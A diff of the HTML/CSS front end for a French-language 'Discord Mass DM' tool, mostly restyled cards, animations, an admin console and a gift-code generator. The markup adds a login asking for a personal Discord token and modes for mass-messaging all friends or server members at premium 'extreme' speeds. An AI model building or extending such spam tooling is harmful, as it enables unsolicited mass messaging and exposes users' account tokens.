-            flex-wrap: wrap;
         }
 
         /* Stats Cards */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            grid-template-columns: repeat(4, 1fr);
             gap: 20px;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         .stat-card {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 35px;
-            padding: 25px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 25px;
             text-align: center;
-            transition: all 0.3s;
+            transition: all 0.4s;
             animation: slideInUp 0.6s ease-out;
             animation-fill-mode: both;
         }
@@ -742,72 +736,107 @@
         .stat-card:nth-child(2) { animation-delay: 0.2s; }
         .stat-card:nth-child(3) { animation-delay: 0.3s; }
         .stat-card:nth-child(4) { animation-delay: 0.4s; }
-        .stat-card:nth-child(5) { animation-delay: 0.5s; }
 
         .stat-card:hover {
-            transform: translateY(-10px);
+            transform: translateY(-10px) scale(1.05);
             border-color: #5865f2;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 20px 40px rgba(88, 101, 242, 0.3);
         }
 
         .stat-icon {
-            font-size: 40px;
-            margin-bottom: 15px;
+            font-size: 32px;
+            margin-bottom: 10px;
+            animation: bounce 3s ease-in-out infinite;
         }
 
         .stat-value {
-            font-size: 36px;
+            font-size: 32px;
             font-weight: 800;
             margin-bottom: 5px;
-            background: linear-gradient(135deg, #fff, #5865f2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
         }
 
         .stat-label {
             color: #9fa6c2;
-            font-size: 14px;
+            font-size: 13px;
         }
+
+        .stat-success { color: #22c55e; }
+        .stat-error { color: #ef4444; }
+        .stat-primary { color: #5865f2; }
+        .stat-premium { color: #a855f7; }
 
         /* DM Modes */
         .dm-modes {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            grid-template-columns: repeat(3, 1fr);
             gap: 20px;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         .dm-card {
-            background: rgba(26, 29, 43, 0.8);
-            border: 2px solid transparent;
-            border-radius: 40px;
-            padding: 30px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 3px solid transparent;
+            border-radius: 50px;
+            padding: 30px;
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s;
-            animation: slideInUp 0.6s ease-out;
+            transition: all 0.4s;
+            animation: scaleIn 0.6s ease-out;
             animation-fill-mode: both;
+            position: relative;
+            overflow: hidden;
         }
 
         .dm-card:nth-child(1) { animation-delay: 0.1s; }
         .dm-card:nth-child(2) { animation-delay: 0.2s; }
         .dm-card:nth-child(3) { animation-delay: 0.3s; }
-        .dm-card:nth-child(4) { animation-delay: 0.4s; }
+
+        .dm-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, rgba(88, 101, 242, 0.3), transparent);
+            animation: spin 4s linear infinite;
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+
+        .dm-card:hover::before {
+            opacity: 1;
+        }
 
         .dm-card:hover {
-            transform: translateY(-10px) scale(1.02);
+            transform: translateY(-10px) scale(1.05);
             border-color: #5865f2;
-            box-shadow: 0 15px 40px rgba(88, 101, 242, 0.3);
+            box-shadow: 0 20px 40px rgba(88, 101, 242, 0.4);
         }
 
         .dm-card.selected {
             border-color: #5865f2;
-            background: rgba(88, 101, 242, 0.1);
-            box-shadow: 0 0 30px rgba(88, 101, 242, 0.3);
+            background: rgba(88, 101, 242, 0.15);
+        }
+
+        .dm-card.premium {
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.1);
+        }
+
+        .dm-card.premium.selected {
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.2);
+        }
+
+        .dm-card.locked {
+            opacity: 0.6;
+            cursor: not-allowed;
+            filter: grayscale(0.5);
         }
 
         .dm-icon {
-            font-size: 50px;
+            font-size: 36px;
             margin-bottom: 15px;
             animation: bounce 3s ease-in-out infinite;
         }
@@ -819,17 +848,96 @@
         }
 
         .dm-desc {
+            font-size: 13px;
             color: #9fa6c2;
+        }
+
+        .premium-tag {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(135deg, #a855f7, #9333ea);
+            color: white;
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        /* Speed Modes */
+        .speed-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .speed-card {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            animation: scaleIn 0.5s ease-out;
+            animation-fill-mode: both;
+        }
+
+        .speed-card:nth-child(1) { animation-delay: 0.1s; }
+        .speed-card:nth-child(2) { animation-delay: 0.2s; }
+        .speed-card:nth-child(3) { animation-delay: 0.3s; }
+        .speed-card:nth-child(4) { animation-delay: 0.4s; }
+
+        .speed-card:hover {
+            transform: translateY(-5px) scale(1.05);
+            border-color: #5865f2;
+        }
+
+        .speed-card.selected {
+            border-color: #5865f2;
+            background: rgba(88, 101, 242, 0.15);
+        }
+
+        .speed-card.premium {
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.1);
+        }
+
+        .speed-card.premium.selected {
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.2);
+        }
+
+        .speed-card.locked {
+            opacity: 0.5;
+            cursor: not-allowed;
+            filter: grayscale(0.5);
+        }
+
+        .speed-emoji {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .speed-name {
+            font-weight: 600;
             font-size: 14px;
+        }
+
+        .speed-time {
+            font-size: 11px;
+            color: #9fa6c2;
         }
 
         /* Config Panel */
         .config-panel {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
             border-radius: 50px;
             padding: 35px;
-            margin: 30px 0;
+            margin-bottom: 30px;
             animation: slideInUp 0.6s ease-out;
             animation-delay: 0.5s;
         }
@@ -841,49 +949,32 @@
         }
 
         @media (max-width: 768px) {
-            .config-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        textarea.input-field {
-            min-height: 120px;
-            resize: vertical;
-        }
-
-        select.input-field {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%239fa6c2' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3E%3C/svg%3E");
-            background-position: right 15px center;
-            background-repeat: no-repeat;
-            background-size: 20px;
-            padding-right: 45px;
+            .config-grid { grid-template-columns: 1fr; }
         }
 
         /* Progress */
         .progress-container {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
             border-radius: 50px;
-            padding: 35px;
-            margin-top: 30px;
+            padding: 30px;
+            margin-bottom: 30px;
             animation: slideInUp 0.6s ease-out;
         }
 
         .progress-header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
-            font-size: 18px;
-            font-weight: 700;
+            margin-bottom: 15px;
+            font-size: 16px;
         }
 
         .progress-bar {
             height: 12px;
-            background: #2a314a;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             overflow: hidden;
-            margin: 20px 0;
+            margin-bottom: 15px;
         }
 
         .progress-fill {
@@ -897,9 +988,7 @@
         .progress-stats {
             display: flex;
             justify-content: space-between;
-            margin: 15px 0;
-            color: #9fa6c2;
-            font-size: 16px;
+            font-size: 14px;
         }
 
         /* Admin Panel */
@@ -907,172 +996,226 @@
             margin-top: 40px;
             padding: 40px;
             background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(88, 101, 242, 0.2));
-            border: 2px solid #ef4444;
+            border: 3px solid #ef4444;
             border-radius: 70px;
             animation: glow 4s ease-in-out infinite;
         }
 
-        .admin-header {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-
         .admin-title {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 800;
-            background: linear-gradient(135deg, #ef4444, #5865f2);
+            background: linear-gradient(135deg, #ef4444, #5865f2, #a855f7);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            text-align: center;
             animation: glitch 3s ease-in-out infinite;
         }
 
-        .bot-config {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 30px;
+        .admin-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
             margin-bottom: 30px;
         }
 
-        .bot-status {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 20px;
-            padding: 20px;
-            background: #2a314a;
-            border-radius: 30px;
+        @media (max-width: 768px) {
+            .admin-grid { grid-template-columns: 1fr; }
         }
 
-        .status-dot {
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
+        .admin-section {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 25px;
+            animation: slideInUp 0.6s ease-out;
+            animation-fill-mode: both;
+        }
+
+        .admin-section:nth-child(1) { animation-delay: 0.1s; }
+        .admin-section:nth-child(2) { animation-delay: 0.2s; }
+        .admin-section:nth-child(3) { animation-delay: 0.3s; }
+        .admin-section:nth-child(4) { animation-delay: 0.4s; }
+
+        .admin-section h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-list {
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .user-list::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .user-list::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .user-list::-webkit-scrollbar-thumb {
+            background: #5865f2;
+            border-radius: 10px;
+        }
+
+        .user-item {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 10px 15px;
+            margin-bottom: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            animation: slideInLeft 0.3s ease-out;
+        }
+
+        .user-item.premium { border-left: 4px solid #a855f7; }
+        .user-item.admin { border-left: 4px solid #ef4444; }
+        .user-item.banned { opacity: 0.5; }
+
+        /* Générateur de codes */
+        .code-generator {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.3), rgba(88, 101, 242, 0.3));
+            border: 3px solid #a855f7;
+            border-radius: 50px;
+            padding: 35px;
+            margin-bottom: 30px;
+            animation: glow 4s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .code-generator::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, #a855f7, transparent, #5865f2, transparent);
+            animation: spin 8s linear infinite;
+            opacity: 0.3;
+        }
+
+        .code-generator h3 {
+            font-size: 24px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             animation: pulse 2s ease-in-out infinite;
         }
 
-        .status-dot.online {
-            background: #22c55e;
-            box-shadow: 0 0 20px #22c55e;
-        }
-
-        .status-dot.offline {
-            background: #ef4444;
-            box-shadow: 0 0 20px #ef4444;
-        }
-
-        /* Code Generator */
-        .code-generator {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 30px;
-            margin-bottom: 30px;
-        }
-
-        .code-grid {
+        .code-generator-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
         }
 
-        .code-item {
-            background: #2a314a;
-            border: 2px solid #a855f7;
-            border-radius: 30px;
-            padding: 20px;
+        .code-generator-item {
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 25px;
             text-align: center;
-            transition: all 0.3s;
-            animation: scaleIn 0.5s ease-out;
+            transition: all 0.4s;
+            animation: scaleIn 0.6s ease-out;
+            animation-fill-mode: both;
         }
 
-        .code-item:hover {
-            transform: translateY(-5px) scale(1.02);
-            box-shadow: 0 0 30px rgba(168, 85, 247, 0.4);
+        .code-generator-item:nth-child(1) { animation-delay: 0.1s; }
+        .code-generator-item:nth-child(2) { animation-delay: 0.2s; }
+        .code-generator-item:nth-child(3) { animation-delay: 0.3s; }
+        .code-generator-item:nth-child(4) { animation-delay: 0.4s; }
+
+        .code-generator-item:hover {
+            transform: translateY(-10px) scale(1.05);
+            border-color: #a855f7;
+            box-shadow: 0 20px 40px rgba(168, 85, 247, 0.4);
         }
 
         .code-value {
-            font-size: 20px;
-            font-weight: 700;
+            font-size: 24px;
+            font-weight: 800;
             color: #a855f7;
-            margin-bottom: 10px;
-            letter-spacing: 2px;
+            margin-bottom: 15px;
+            letter-spacing: 3px;
+            font-family: 'Space Mono', monospace;
+            animation: neon 2s ease-in-out infinite;
+        }
+
+        .code-info {
+            font-size: 14px;
+            color: #9fa6c2;
+            margin-bottom: 20px;
         }
 
         .code-uses {
             color: #22c55e;
             font-weight: 700;
+            font-size: 16px;
         }
 
-        /* Connection Logs */
-        .connection-logs {
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 30px;
-            margin-bottom: 30px;
-            overflow-x: auto;
+        .code-actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
         }
 
-        .logs-table {
-            width: 100%;
-            border-collapse: collapse;
-            min-width: 700px;
-        }
-
-        .logs-table th {
-            text-align: left;
-            padding: 15px;
-            color: #9fa6c2;
-            font-weight: 700;
-            font-size: 14px;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .logs-table td {
-            padding: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .logs-table tr {
-            transition: all 0.3s;
-        }
-
-        .logs-table tr:hover {
-            background: rgba(255, 255, 255, 0.05);
-            transform: scale(1.01);
+        .code-actions button {
+            padding: 10px 20px;
+            font-size: 13px;
         }
 
         /* Console */
-        .admin-console {
+        .console-container {
+            margin-top: 30px;
             background: #0a0c15;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50px;
             padding: 25px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Space Mono', monospace;
+            animation: slideInUp 0.6s ease-out;
+        }
+
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .console-title {
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: 700;
+            animation: neon 2s ease-in-out infinite;
         }
 
         .console-output {
             height: 250px;
             overflow-y: auto;
             color: #00ff00;
-            font-size: 14px;
+            font-size: 13px;
+            line-height: 1.8;
             margin-bottom: 20px;
             padding: 20px;
             background: #000;
-            border-radius: 25px;
+            border-radius: 30px;
+            border: 2px solid #333;
             white-space: pre-wrap;
-            border: 1px solid #333;
-            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+            box-shadow: inset 0 0 30px rgba(0, 255, 0, 0.2);
         }
 
         .console-output::-webkit-scrollbar {
-            width: 10px;
+            width: 8px;
         }
 
         .console-output::-webkit-scrollbar-track {
@@ -1085,6 +1228,27 @@
             border-radius: 10px;
         }
 
+        .console-line {
+            margin-bottom: 5px;
+            animation: slideInLeft 0.2s ease-out;
+        }
+
+        .console-time {
+            color: #666;
+            margin-right: 15px;
+        }
+
+        .console-command {
+            color: #00ff00;
+            font-weight: 700;
+        }
+
+        .console-success { color: #44ff44; }
+        .console-error { color: #ff4444; }
+        .console-info { color: #4444ff; }
+        .console-premium { color: #ff44ff; }
+        .console-warning { color: #ffff44; }
+
         .console-input-group {
             display: flex;
             gap: 15px;
@@ -1094,10 +1258,10 @@
             flex: 1;
             padding: 15px 20px;
             background: #1a1a1a;
-            border: 2px solid #333;
-            border-radius: 25px;
+            border: 3px solid #333;
+            border-radius: 40px;
             color: #00ff00;
-            font-family: 'Courier New', monospace;
+            font-family: 'Space Mono', monospace;
             font-size: 14px;
             transition: all 0.3s;
         }
@@ -1105,7 +1269,7 @@
         .console-input-group input:focus {
             outline: none;
             border-color: #00ff00;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
         }
 
         .console-input-group button {
@@ -1113,57 +1277,21 @@
             background: linear-gradient(135deg, #22c55e, #16a34a);
             color: white;
             border: none;
-            border-radius: 25px;
+            border-radius: 40px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
         }
 
         .console-input-group button:hover {
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 40px rgba(34, 197, 94, 0.5);
         }
 
-        /* Logs */
-        .logs-container {
-            margin-top: 30px;
-            background: rgba(26, 29, 43, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 25px;
-            animation: slideInUp 0.6s ease-out;
-            animation-delay: 0.6s;
-        }
-
-        .logs-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .logs-content {
-            max-height: 150px;
-            overflow-y: auto;
-        }
-
-        .log-entry {
-            padding: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            display: flex;
-            gap: 15px;
-            color: #9fa6c2;
-            transition: all 0.3s;
-        }
-
-        .log-entry:hover {
-            background: rgba(255, 255, 255, 0.02);
-            padding-left: 15px;
-        }
-
-        .log-time {
-            color: #5865f2;
-            font-weight: 600;
+        .console-help {
+            margin-top: 15px;
+            color: #666;
+            font-size: 12px;
         }
 
         /* Toast */
@@ -1171,18 +1299,18 @@
             position: fixed;
             bottom: 30px;
             right: 30px;
-            background: rgba(18, 22, 36, 0.95);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 30px;
+            background: rgba(26, 29, 43, 0.98);
+            backdrop-filter: blur(20px);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 40px;
             padding: 20px 25px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            z-index: 1000;
+            gap: 20px;
             animation: slideInRight 0.5s, fadeOut 0.5s 4.5s forwards;
+            z-index: 10000;
+            max-width: 400px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
-            max-width: 450px;
         }
 
         @keyframes fadeOut {
@@ -1190,23 +1318,32 @@
             to { opacity: 0; transform: translateX(100%); }
         }
 
-        .toast.success .toast-icon { color: #22c55e; }
-        .toast.error .toast-icon { color: #ef4444; }
-        .toast.info .toast-icon { color: #5865f2; }
+        .toast.success { border-left: 5px solid #22c55e; }
+        .toast.error { border-left: 5px solid #ef4444; }
+        .toast.info { border-left: 5px solid #5865f2; }
+        .toast.premium { border-left: 5px solid #a855f7; }
 
         .toast-icon {
             font-size: 28px;
         }
 
+        .toast.success .toast-icon { color: #22c55e; }
+        .toast.error .toast-icon { color: #ef4444; }
+        .toast.info .toast-icon { color: #5865f2; }
+        .toast.premium .toast-icon { color: #a855f7; }
+
+        .toast-content {
+            flex: 1;
+        }
+
         .toast-title {
             font-weight: 700;
             margin-bottom: 5px;
-            font-size: 16px;
         }
 
         .toast-message {
             color: #9fa6c2;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .toast-close {
@@ -1223,94 +1360,54 @@
             transform: rotate(90deg);
         }
 
+        /* Logs */
+        .logs-container {
+            margin-top: 30px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 20px;
+            animation: slideInUp 0.6s ease-out;
+            animation-delay: 0.6s;
+        }
+
+        .logs-content {
+            max-height: 120px;
+            overflow-y: auto;
+            font-size: 13px;
+        }
+
+        .log-entry {
+            padding: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            animation: slideInLeft 0.2s ease-out;
+        }
+
+        .admin-only {
+            display: block;
+        }
+
         /* Utilities */
-        .hidden {
-            display: none !important;
+        .hidden { display: none !important; }
+        .flex { display: flex; }
+        .gap-4 { gap: 16px; }
+        .text-center { text-align: center; }
+        .mt-4 { margin-top: 16px; }
+        .mb-4 { margin-bottom: 16px; }
+
+        /* Assurer que tout est cliquable */
+        .login-card, .login-card *,
+        .code-section, .code-section *,
+        .btn, .btn *,
+        .input-group, .input-group *,
+        .dm-card, .dm-card *,
+        .speed-card, .speed-card * {
+            pointer-events: auto !important;
+            cursor: pointer;
         }
 
-        .flex {
-            display: flex;
-        }
-
-        .flex-wrap {
-            flex-wrap: wrap;
-        }
-
-        .gap-4 {
-            gap: 16px;
-        }
-
-        .mt-4 {
-            margin-top: 16px;
-        }
-
-        .mb-4 {
-            margin-bottom: 16px;
-        }
-
-        .text-center {
-            text-align: center;
-        }
-
-        .text-success {
-            color: #22c55e;
-        }
-
-        .text-error {
-            color: #ef4444;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .dashboard-header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-
-            .header-actions {
-                width: 100%;
-            }
-
-            .btn {
-                width: 100%;
-            }
-
-            .code-input-group {
-                flex-direction: column;
-            }
-
-            .code-input-group button {
-                width: 100%;
-            }
-
-            .console-input-group {
-                flex-direction: column;
-            }
-
-            .console-input-group button {
-                width: 100%;
-            }
-
-            .toast {
-                left: 20px;
-                right: 20px;
-                max-width: none;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .user-profile {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .dm-modes {
-                grid-template-columns: 1fr;
-            }
+        input, select, textarea, button {
+            pointer-events: auto !important;
         }
     </style>
 </head>
@@ -1322,45 +1419,29 @@
         <span></span>
         <span></span>
         <span></span>
+        <span></span>
+        <span></span>
     </div>
 
     <div class="container">
         <!-- LOGIN SCREEN -->
         <div id="login-screen" class="login-screen">
             <div class="login-card">
-                <div class="login-header">
-                    <div class="login-logo animate-float">
-                        <i class="fas fa-bolt"></i>
-                    </div>
-                    <h1 class="login-title">Discord Mass DM</h1>
-                    <p class="login-subtitle animate-typing">Solution ultra sécurisée avec animations</p>
+                <div class="login-logo">
+                    <i class="fas fa-bolt"></i>
                 </div>
-
-                <!-- CODE CADEAU SECTION -->
-                <div class="code-section">
-                    <div class="code-title">
-                        <span>🎁</span>
-                        <span>VOUS AVEZ UN CODE ?</span>
-                        <span>🎁</span>
-                    </div>
-                    <div class="code-input-group">
-                        <input type="text" id="giftCode" placeholder="CODE-XXXX" maxlength="9">
-                        <button onclick="window.redeemCode()" id="redeemBtn">VALIDER</button>
-                    </div>
-                </div>
+                <h1 class="login-title">Discord Mass DM</h1>
+                <p class="login-subtitle">Premium = vitesse Extreme</p>
 
                 <div class="input-group">
-                    <label class="input-label"><i class="fas fa-key"></i> TOKEN DISCORD</label>
-                    <input type="password" id="token" class="input-field" placeholder="Entrez votre token">
+                    <input type="password" id="token" placeholder="Token Discord" autocomplete="off">
                 </div>
 
                 <button class="btn btn-primary" onclick="window.login()" id="loginBtn">
-                    <i class="fas fa-sign-in-alt"></i>
-                    <span>SE CONNECTER</span>
+                    <i class="fas fa-sign-in-alt"></i> SE CONNECTER
                 </button>
 
-                <div id="loginError" class="alert alert-error"></div>
-                <div id="codeMessage" class="alert alert-success"></div>
+                <div id="loginError" class="toast error hidden"></div>
             </div>
         </div>
 
@@ -1376,121 +1457,137 @@
                         </div>
                         <div class="user-info">
                             <h2 id="username">Chargement...</h2>
-                            <span id="roleBadge" class="badge"><i class="fas fa-user"></i> Utilisateur</span>
+                            <span id="roleBadge" class="user-badge">Utilisateur</span>
                         </div>
                     </div>
                     <div class="header-actions">
-                        <button id="adminPanelBtn" class="btn btn-error hidden" onclick="window.toggleAdminPanel()">
-                            <i class="fas fa-crown"></i>
-                            <span>PANEL ADMIN</span>
+                        <button id="adminPanelBtn" class="btn btn-outline hidden" onclick="window.toggleAdminPanel()">
+                            <i class="fas fa-crown"></i> Admin
                         </button>
                         <button class="btn btn-outline" onclick="window.logout()">
                             <i class="fas fa-sign-out-alt"></i>
-                            <span>DÉCONNEXION</span>
                         </button>
                     </div>
                 </div>
 
-                <!-- STATS CARDS -->
+                <!-- CODE SECTION -->
+                <div class="code-section">
+                    <div class="code-title">
+                        <i class="fas fa-gift"></i>
+                        <span>CODE CADEAU PREMIUM</span>
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <div class="code-input-group">
+                        <input type="text" id="giftCode" placeholder="XXXX-XXXX" maxlength="9">
+                        <button onclick="window.redeemCode()"><i class="fas fa-check"></i> VALIDER</button>
+                    </div>
+                    <div id="codeMessage" class="toast hidden" style="margin-top: 10px;"></div>
+                </div>
+
+                <!-- STATS -->
                 <div class="stats-grid">
                     <div class="stat-card">
                         <div class="stat-icon"><i class="fas fa-users"></i></div>
-                        <div class="stat-value" id="friendsCount">0</div>
+                        <div class="stat-value" id="globalFriends">0</div>
                         <div class="stat-label">Amis</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-icon"><i class="fas fa-server"></i></div>
-                        <div class="stat-value" id="guildsCount">0</div>
+                        <div class="stat-value" id="globalGuilds">0</div>
                         <div class="stat-label">Serveurs</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
-                        <div class="stat-value" id="sentCount">0</div>
+                        <div class="stat-icon"><i class="fas fa-check-circle stat-success"></i></div>
+                        <div class="stat-value stat-success" id="globalSent">0</div>
                         <div class="stat-label">Envoyés</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-icon"><i class="fas fa-times-circle"></i></div>
-                        <div class="stat-value" id="failedCount">0</div>
+                        <div class="stat-icon"><i class="fas fa-times-circle stat-error"></i></div>
+                        <div class="stat-value stat-error" id="globalFailed">0</div>
                         <div class="stat-label">Échecs</div>
                     </div>
-                    <div class="stat-card">
-                        <div class="stat-icon"><i class="fas fa-robot"></i></div>
-                        <div class="stat-value" id="botStatus">Off</div>
-                        <div class="stat-label">Bot</div>
-                    </div>
                 </div>
 
-                <!-- 4 MODES DM -->
+                <!-- 3 MODES DM -->
                 <div class="dm-modes">
-                    <div class="dm-card selected" onclick="window.selectDMMode(1)" id="dmMode1">
-                        <div class="dm-icon"><i class="fas fa-users"></i></div>
-                        <div class="dm-title">DM All Amis</div>
-                        <div class="dm-desc">Gratuit</div>
+                    <div class="dm-card selected" onclick="window.selectMode(1)" id="mode1">
+                        <div class="dm-icon"><i class="fas fa-user-friends"></i></div>
+                        <div class="dm-title">DM Amis</div>
+                        <div class="dm-desc">Gratuit - Token personnel</div>
                     </div>
-                    <div class="dm-card" onclick="window.selectDMMode(2)" id="dmMode2">
+                    <div class="dm-card premium" onclick="window.selectMode(2)" id="mode2">
+                        <div class="premium-tag">PREMIUM</div>
                         <div class="dm-icon"><i class="fas fa-server"></i></div>
-                        <div class="dm-title">DM All Serveur</div>
-                        <div class="dm-desc" id="mode2Desc">Gratuit</div>
+                        <div class="dm-title">DM Serveur</div>
+                        <div class="dm-desc">Premium - Token personnel</div>
                     </div>
-                    <div class="dm-card" onclick="window.selectDMMode(3)" id="dmMode3">
-                        <div class="dm-icon"><i class="fas fa-robot"></i></div>
-                        <div class="dm-title">DM Amis (Bot)</div>
-                        <div class="dm-desc" id="mode3Desc">Bot requis</div>
-                    </div>
-                    <div class="dm-card" onclick="window.selectDMMode(4)" id="dmMode4">
-                        <div class="dm-icon"><i class="fas fa-robot"></i><i class="fas fa-server"></i></div>
+                    <div class="dm-card" onclick="window.selectMode(3)" id="mode3">
+                        <div class="dm-icon"><i class="fas fa-robot"></i> <i class="fas fa-server"></i></div>
                         <div class="dm-title">DM Serveur (Bot)</div>
-                        <div class="dm-desc" id="mode4Desc">Gratuit avec bot</div>
+                        <div class="dm-desc">Gratuit - Token bot</div>
                     </div>
                 </div>
 
-                <!-- CONFIGURATION PANEL -->
+                <!-- VITESSES -->
+                <div class="speed-grid">
+                    <div class="speed-card selected" onclick="window.selectSpeed('slow')" id="speedSlow">
+                        <div class="speed-emoji">🐢</div>
+                        <div class="speed-name">Safe</div>
+                        <div class="speed-time">3-5s</div>
+                    </div>
+                    <div class="speed-card" onclick="window.selectSpeed('normal')" id="speedNormal">
+                        <div class="speed-emoji">⚡</div>
+                        <div class="speed-name">Normal</div>
+                        <div class="speed-time">2-4s</div>
+                    </div>
+                    <div class="speed-card" onclick="window.selectSpeed('fast')" id="speedFast">
+                        <div class="speed-emoji">🚀</div>
+                        <div class="speed-name">Rapide</div>
+                        <div class="speed-time">1-3s</div>
+                    </div>
